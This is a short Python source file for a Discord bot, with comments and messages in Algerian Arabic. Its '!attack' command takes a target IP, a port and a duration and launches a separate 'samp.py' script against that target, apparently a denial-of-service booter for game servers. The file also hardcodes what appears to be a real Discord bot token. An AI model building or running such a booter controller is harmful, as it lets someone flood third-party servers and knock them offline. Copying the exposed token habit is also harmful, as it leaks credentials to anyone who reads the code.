import discord
from discord.ext import commands
import subprocess

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

OWNER_ID = 898663928308060180  # حط ID تاعك هنا

@bot.command()
async def attack(ctx, ip: str, port: str, time: str):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("🚫 ماعندكش صلاحية تستعمل هذا الأمر.")

    embed_start = discord.Embed(
        title="🚀 إطلاق الهجمة...",
        description=f"**الهدف:** `{ip}`\n**المنفذ:** `{port}`\n**المدة:** `{time}` ثانية\n**الطريقة:** هجمة",
        color=0xff0000
    )

    await ctx.send(embed=embed_start)

    try:
        subprocess.Popen(["python3", "samp.py", ip, port, time])
    except Exception as e:
        await ctx.send(f"❌ خطأ أثناء التنفيذ: `{e}`")
        return

    embed_done = discord.Embed(
        title="✅ تم إرسال الهجمة!",
        description="تم إطلاق الهجمة بنجاح!",
        color=0x00ff00
    )
    await ctx.send(embed=embed_done)

bot.run("MTM3OTIzNTMyMzM1NTIwMTUzNw.GIuBlr.PyQLmobZ1C_fjaAtJWRVblqlw73UMSOJ5vQipg")
